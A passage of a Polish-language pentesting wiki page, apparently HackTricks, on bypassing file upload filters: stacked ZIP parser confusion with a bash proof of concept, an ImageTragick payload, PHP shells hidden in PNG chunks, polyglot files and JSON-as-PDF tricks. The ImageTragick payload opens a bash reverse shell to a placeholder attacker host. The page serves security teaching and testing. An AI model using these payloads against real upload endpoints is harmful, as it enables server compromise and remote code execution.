Konkatenacja dwóch prawidłowych plików ZIP tworzy blob, w którym różne parsery skupiają się na różnych rekordach EOCD. Wiele narzędzi lokalizuje ostatni End Of Central Directory (EOCD), podczas gdy niektóre biblioteki (np. ZipArchive w określonych workflows) mogą parsować pierwsze napotkane archiwum. Jeśli walidacja enumeruje pierwsze archiwum, a wyodrębnianie użyje innego narzędzia, które respektuje ostatni EOCD, nieszkodliwe archiwum może przejść kontrole, podczas gdy złośliwe zostanie wypakowane.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Wzorzec nadużycia
- Utwórz archiwum nieszkodliwe (dozwolony typ, np. PDF) oraz drugie archiwum zawierające zablokowane rozszerzenie (np. `shell.php`).
- Połącz je: `cat benign.zip evil.zip > combined.zip`.
- Jeśli serwer weryfikuje przy użyciu jednego parsera (sees benign.zip), ale rozpakowuje przy użyciu innego (processes evil.zip), zablokowany plik trafia do ścieżki rozpakowania.

## ImageTragic

Prześlij tę zawartość z rozszerzeniem pliku graficznego, aby wykorzystać podatność **(ImageMagick , 7.0.1-1)** (z [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Osadzenie PHP shell w IDAT chunk pliku PNG może skutecznie obejść niektóre operacje przetwarzania obrazów. Funkcje `imagecopyresized` i `imagecopyresampled` z PHP-GD są szczególnie istotne w tym kontekście, ponieważ są powszechnie używane odpowiednio do zmiany rozmiaru i resamplingu obrazów. Możliwość, że osadzony PHP shell pozostanie nienaruszony przez te operacje, stanowi istotną przewagę w określonych przypadkach użycia.

Szczegółowe omówienie tej techniki, w tym metodologia i potencjalne zastosowania, znajduje się w następującym artykule: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ten materiał oferuje kompleksowe zrozumienie procesu i jego implikacji.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files działają jak kameleony — mogą jednocześnie poprawnie istnieć w wielu formatach plików. Interesującym przykładem jest [GIFAR](https://en.wikipedia.org/wiki/Gifar), hybryda działająca zarówno jako GIF, jak i archiwum RAR. Takie pliki nie ograniczają się do tej pary; możliwe są też kombinacje typu GIF i JS czy PPT i JS.

Główna użyteczność polyglot files polega na ich zdolności do obchodzenia mechanizmów bezpieczeństwa, które sprawdzają pliki na podstawie typu. W praktyce wiele aplikacji zezwala na upload tylko określonych typów plików — np. JPEG, GIF czy DOC — aby ograniczyć ryzyko związane z potencjalnie szkodliwymi formatami (np. JS, PHP czy Phar). Jednakże polyglot, spełniając kryteria strukturalne wielu formatów, może potajemnie obejść te ograniczenia.

Pomimo swojej elastyczności, polyglots napotykają ograniczenia. Na przykład, choć polyglot może jednocześnie pełnić rolę pliku PHAR (PHp ARchive) i JPEG, powodzenie uploadu może zależeć od polityki rozszerzeń plików danej platformy. Jeśli system rygorystycznie sprawdza dozwolone rozszerzenia, sama strukturalna dwuznaczność polyglota może nie wystarczyć do zagwarantowania możliwości przesłania.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Jak uniknąć wykrywania typu pliku wysyłając poprawny plik JSON, nawet jeśli nie jest to dozwolone, podszywając go pod plik PDF (techniki z **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Dopóki magic bytes `%PDF` znajdują się w pierwszych 1024 bajtach, jest to uznawane za ważne (zobacz przykład w poście)
- **`pdflib` library**: Dodaj fałszywy format PDF wewnątrz pola JSON, aby biblioteka uznała go za PDF (zobacz przykład w poście)
- **`file` binary**: Potrafi odczytać do 1048576 bajtów z pliku. Wystarczy utworzyć JSON większy niż ta wartość, aby nie móc sparsować zawartości jako JSON, a następnie umieścić na początku JSON początkową część prawdziwego PDF i zostanie uznany za PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
